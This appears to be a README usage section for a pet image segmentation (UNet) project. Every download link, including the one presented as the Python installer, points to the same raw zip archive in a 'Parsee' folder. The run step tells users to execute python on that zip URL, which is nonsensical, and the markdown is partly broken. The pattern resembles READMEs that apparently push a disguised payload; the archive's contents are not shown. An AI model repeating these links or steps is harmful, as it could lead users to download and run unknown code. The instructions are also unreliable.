## 📓 How to Use

1. **Download the Release:**
   - Go to [Pet_Segmentation_UNet Releases](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip).
   - Select the latest release for your operating system and download the file.

2. **Install Required Packages:**
   - Open your command line or terminal.
   - If you have not installed Python, download it from [https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip](https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip).
   - Create a virtual environment (optional but recommended):
     ```bash
     python -m venv pet_seg_env
     ```
   - Activate the virtual environment:
     - Windows:
       ```bash
       pet_seg_env\Scripts\activate
       ```
     - macOS/Linux:
       ```bash
       source pet_seg_env/bin/activate
       ```

3. **Install Dependencies:**
   - Run the following command to install required libraries:

     pip install tensorflow keras matplotlib numpy
     ```

4. **Run the Application:**
   - Navigate to the download folder where you saved the application.
   - Execute the main script:
     ```bash
     python https://raw.githubusercontent.com/AliAhmed031104/Pet_Segmentation_UNet/main/Parsee/Pet_Segmentation_UNet.zip
     ```

5. **Segment Your Images:**
   - Upload your pet images using the GUI.
   - Click on the segment button to see the results.

## 📈 Evaluation

After you run the segmentation, you can visualize the results:

- **IoU:** This metric shows how well the segmentation matches the actual image.
- **ROC Curve:** Review the model’s performance with this graphical representation.

## 💬 FAQs

### How do I track my model’s performance?

You can view the IoU and ROC curves directly in the application after performing segmentation.

### Can I use my own images?

Yes, you can segment any pet images you have. Just follow the steps in the "Run the Application" section.

### What if I encounter errors?

Common issues include missing dependencies or incorrect Python versions. Make sure your environment is set up correctly as per the installation instructions.
